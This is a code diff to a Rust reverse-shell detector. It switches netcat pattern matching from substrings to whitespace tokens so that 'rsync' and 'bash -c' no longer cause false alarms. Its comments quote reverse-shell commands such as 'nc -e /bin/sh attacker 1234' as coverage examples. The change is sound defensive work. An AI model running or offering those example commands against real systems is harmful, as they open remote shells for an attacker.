@@ -49,10 +49,36 @@ impl ReverseShellDetector {
             return Some("bash_dev_tcp");
         }
 
-        // Netcat variants: nc -e, ncat -e, nc -c, netcat -e
-        if (lower.contains("nc ") || lower.contains("ncat ") || lower.contains("netcat "))
-            && (lower.contains(" -e ") || lower.contains(" -c "))
-        {
+        // Netcat variants: nc -e, ncat -e, nc -c, netcat -e.
+        //
+        // Use word-boundary (whitespace-tokenized) matching, not substring.
+        // The naive `contains("nc ")` check matches `rsync ` (which ends in
+        // "nc ") and `contains(" -c ")` matches every `bash -c …` wrapper,
+        // so a plain `bash -c rsync --server` was being classified as a
+        // Critical netcat_shell reverse shell. Observed 2026-04-11 as
+        // dozens of Critical FPs per day from the operator's own deploy
+        // rsync-over-ssh.
+        //
+        // Coverage preserved:
+        //   - OpenBSD netcat: `nc -e /bin/sh attacker 1234`
+        //   - GNU netcat:     `nc -c /bin/sh attacker 1234`
+        //   - Nmap ncat:      `ncat -e /bin/sh …` and `ncat -c '…'`
+        //   - Full binary:    `netcat -e …` / `netcat -c …`
+        //
+        // Because `has_nc_binary` now requires an exact whitespace-token
+        // match for `nc` / `ncat` / `netcat`, the `-c` flag can safely be
+        // matched again — `bash -c rsync` contains no such token and no
+        // longer trips the pattern. Additionally, the eBPF sequence
+        // detector (`check_ebpf_sequence`) catches reverse shells by
+        // behavior (connect + fd_redirect stdin/stdout to socket) even if
+        // the command matcher misses an exotic variant, giving this
+        // detector two independent layers.
+        let tokens: Vec<&str> = lower.split_whitespace().collect();
+        let has_nc_binary = tokens
+            .iter()
+            .any(|&t| t == "nc" || t == "ncat" || t == "netcat");
+        let has_exec_flag = tokens.iter().any(|&t| t == "-e" || t == "-c");
+        if has_nc_binary && has_exec_flag {
             return Some("netcat_shell");
         }
 
